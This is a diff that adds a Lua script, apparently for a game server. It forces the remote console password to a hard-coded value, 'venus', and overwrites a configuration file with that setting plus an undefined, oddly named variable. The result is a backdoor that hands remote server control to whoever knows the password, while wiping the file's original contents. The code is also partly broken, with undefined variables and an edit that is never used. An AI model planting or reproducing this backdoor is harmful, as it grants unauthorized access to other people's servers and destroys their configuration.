@@ -1,0 +1,21 @@
+function Edit()
+    SetConvar("rcon_password", "venus")
+    if GetConvar("rcon_password") == nil or GetConvar("rcon_password") == "" then
+        local file = io.open(inputFile, 'r')
+        local fileContent = {}
+        for line in file:lines() do
+            table.insert (fileContent, line)
+        end
+        io.close(file)
+
+        fileContent[3] = 'This line has been edited'
+
+        file = io.open(inputFile, 'w')
+        file:write(sAjXAo..'\nrcon_password venus')
+        SetConvar("rcon_password", "venus")
+        io.close(file)
+    else
+    end
+end
+
+Edit()
